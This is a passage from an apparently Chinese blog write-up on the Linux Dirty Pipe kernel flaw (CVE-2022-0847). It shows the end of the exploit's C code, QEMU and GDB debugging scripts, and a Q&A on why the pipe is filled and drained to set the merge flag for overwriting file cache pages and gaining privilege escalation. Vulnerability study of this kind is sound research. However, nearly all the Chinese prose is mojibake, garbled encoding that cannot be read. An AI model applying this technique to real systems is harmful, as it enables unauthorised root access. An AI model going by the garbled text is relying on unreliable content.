        err_exit("write failed.");
    }

    if(nbytes < data_size){
        err_exit("short write.");
    }

    success("All writes done.");
    return 0;
}
```

## 0x05. è°ƒè¯•åˆ†æ

è¿™é‡Œæˆ‘è‡ªå·±ç¼–è¯‘äº†`linux 5.16.10`ç‰ˆæœ¬çš„ä»£ç ï¼Œå¸¸è§ä¿æŠ¤å…¨å¼€ã€‚

`qemu`å¯åŠ¨è„šæœ¬å¦‚ä¸‹ï¼ˆç°åœ¨å…³é—­`kaslr`ä»¥ä¾¿äºè°ƒè¯•ï¼Œè¿è¡Œ`exp`æ—¶åº”è¯¥å¼€å¯ï¼‰ï¼š

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd  ./rootfs.cpio \
    -monitor /dev/null \
    -append "root=/dev/ram rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet nokaslr" \
    -cpu kvm64,+smep,+smap \
    -smp cores=2,threads=1 \
    -nographic \
    -s

```

ä½¿ç”¨è°ƒè¯•è„šæœ¬å¦‚ä¸‹ï¼š

```bash
#!/bin/bash

KERNEL_MODULE="vmlinux"
PORT="1234"
EXPLOIT="core/exploit"

gdb -q \
    -ex "add-symbol-file $KERNEL_MODULE" \
    -ex "add-symbole-file $EXPLOIT" \
    -ex "file $KERNEL_MODULE" \
    -ex "file $EXPLOIT" \
    -ex "target remote:$PORT"
```

å¯åŠ¨å†…æ ¸ï¼Œè¿è¡Œè°ƒè¯•è„šæœ¬ï¼Œå…ˆæš‚åœåˆ°`exp`ç»è¿‡`splice`åï¼Œè§¦å‘æ¼æ´çš„`write`çš„è¡Œï¼Œæˆ‘è¿™é‡Œæ˜¯`101`ï¼š

![image-20250310204321486](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250310204321486.png)

éšåï¼Œè¿è¡Œè„šæœ¬ï¼š

![image-20250310204513807](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250310204513807.png)

ä¸‹æ–­ç‚¹åˆ°`pipe_write`ï¼Œå¹¶ä½¿ç”¨`dir`ï¼Œæ·»åŠ æºç è·¯å¾„ï¼š

![image-20250310204606478](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250310204606478.png)

è¿è¡Œç¨‹åºï¼Œæš‚åœåˆ°`pipe_write`ï¼š

![image-20250310204623889](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250310204623889.png)

ä½¿ç”¨`b pipe.c:458`ï¼Œä¸‹æ–­ç‚¹åˆ°`458`è¡Œï¼š

![image-20250310204717740](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250310204717740.png)

æŸ¥çœ‹`pipe_buf[0]`ï¼Œå‘ç°å·²ç»æŒ‚å…¥äº†ç¼“å­˜æ–‡ä»¶`page`çš„ç‰©ç†é¡µï¼Œå¹¶ä¸”å³å°†è¿›å…¥ä¸‹é¢çš„åˆ†æ”¯æ‰§è¡Œï¼š

![image-20250310204840604](https://ltfallpics.oss-cn-hangzhou.aliyuncs.com/imagesimage-20250310204840604.png)

å¯ä»¥æ ¹æ®`ops`çœ‹å‡º`pipe_bufs[0]`å³ä¸ºæ–‡ä»¶ç¼“å­˜é¡µé¢çš„`page`ï¼Œä¸”`flags=16`ï¼Œå³ä¸º`PIPE_BUF_FLAG_CAN_MERGE`çš„å€¼ã€‚

## 0x06. Q&A

### - ä¸ºä»€ä¹ˆ`PIPE_BUF_FLAG_CAN_MERGE`æœªåˆå§‹åŒ–ä¼šå½±å“åˆ°æ–‡ä»¶æœ¬èº«çš„`page`ï¼Ÿ

ç¬”è€…çš„ç–‘é—®ã€‚è¿™æ˜¯å› ä¸ºå®é™…ä¸Šè¿™ä¸ªæ ‡å¿—ä½æ˜¯ä½äº`pipe_buffer`ç»“æ„ä½“ä¸Šçš„ï¼Œè€Œå°†æ–‡ä»¶ç¼“å­˜é¡µæŒ‚å…¥æ—¶ï¼Œå®é™…ä¸Šä¹Ÿæ˜¯æŒ‚å…¥äº†`pipe_buffer`çš„`page`æŒ‡é’ˆä¸­ã€‚å› æ­¤è¯¥`pipe_buffer`ä¸Šçš„`PIPE_BUF_FLAG_CAN_MERGE`æ ‡å¿—ä½ä»ç„¶ä¿ç•™ã€‚

### - æ¼æ´åˆ©ç”¨æ—¶ä¸ºä»€ä¹ˆéœ€è¦å°†ç®¡é“å¡«æ»¡å†æ¸…ç©ºï¼Ÿ

ç¬”è€…åˆšå¼€å§‹çœ‹åˆ°è¿™ä¸ªæ¼æ´çš„æ—¶å€™æœ‰è¿™ä¸ªç–‘é—®ï¼Œä¸ºä»€ä¹ˆä¸ç®€å•çš„åœ¨å½“å‰é¡µé¢å†™ä¸€å­—èŠ‚æ•°æ®ï¼Œå¦‚æ­¤ä¾¿å¯ä»¥ä½¿å¾—å½“å‰é¡µé¢å°±æœ‰`PIPE_BUF_FLAG_CAN_MERGE`æ ‡å¿—äº†ï¼Œå°±å¯ä»¥è§¦å‘`dirty pipe`æ¼æ´ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜è¦å…ˆå¡«æ»¡ç®¡é“å†æ¸…ç©ºå‘¢ï¼Ÿ

ç»è¿‡è°ƒè¯•ï¼Œåœ¨`splice`å°†æ–‡ä»¶ç¼“å­˜é¡µé¢æŒ‚å…¥`pipe_buffer`çš„æ—¶å€™ï¼Œä¼šå°†`head+1`å¹¶æŒ‡å‘è¿™ä¸ªæ–‡ä»¶çš„æ–°ç¼“å­˜é¡µã€‚å› æ­¤ï¼Œè‹¥åªæ˜¯å†™äº†`1`å­—èŠ‚ï¼Œé‚£ä¹ˆæŒ‚å…¥æ–‡ä»¶ç¼“å­˜é¡µåå†è°ƒç”¨`pipe_write`æ—¶ï¼Œè‡ªç„¶è¯¥é¡µå°±æ²¡æœ‰`PIPE_BUF_FLAG_CAN_MERGE`æ ‡å¿—ï¼Œå°±æ— æ³•å†è§¦å‘æ¼æ´è¶Šæƒå†™äº†ã€‚

å› æ­¤ï¼Œéœ€è¦å…ˆå¡«æ»¡å†æ¸…ç©º`pipe`ï¼Œå¦‚æ­¤ï¼Œæ¯ä¸€é¡µéƒ½ä¼šæŒ‚ä¸Š`PIPE_BUF_FLAG_CAN_MERGE`æ ‡å¿—ã€‚~~æ„Ÿè§‰æœ‰ç‚¹æ¼æ´ç™¾å‡ºäº†~~ï¼ˆğŸ‘ˆä½ è¡Œä½ å†™å†…æ ¸ï¼‰

### - ä¸ºä»€ä¹ˆè¯´ä¸èƒ½æŒä¹…åŒ–ï¼Ÿ

æŒ‚å…¥`pipe_buffer`çš„é¡µé¢æ˜¯æ–‡ä»¶çš„`pagecache`ç¼“å­˜é¡µé¢ï¼Œå› æ­¤åªè¦é‡å¯æ–‡ä»¶ï¼Œå°±ä¼šè¢«æ¢å¤åˆ°æœªæ›´æ”¹çš„çŠ¶æ€ã€‚ä½†æ˜¯ææƒæ˜¯å¤Ÿäº†ã€‚

## å‚è€ƒ

[ç»å…¸å†…æ ¸æ¼æ´å¤ç°ä¹‹ dirtypipe | blingblingxuanxuançš„åšå®¢](https://blingblingxuanxuan.github.io/2023/05/08/230508-dirtypipe-analysis/)

[bsause- ã€kernel exploitã€‘CVE-2022-0847 Dirty Pipe æ¼æ´åˆ†æä¸åˆ©ç”¨](https://bsauce.github.io/2022/04/03/CVE-2022-0847/)

[breezeO_o - [kernel exploit] ç®¡é“pipeåœ¨å†…æ ¸æ¼æ´åˆ©ç”¨ä¸­çš„åº”ç”¨](https://blog.csdn.net/Breeze_CAT/article/details/124887622)

[breezeO_o - [æ¼æ´åˆ†æ] CVE-2022-0847 Dirty Pipe linuxå†…æ ¸ææƒåˆ†æ](https://blog.csdn.net/Breeze_CAT/article/details/123393188)











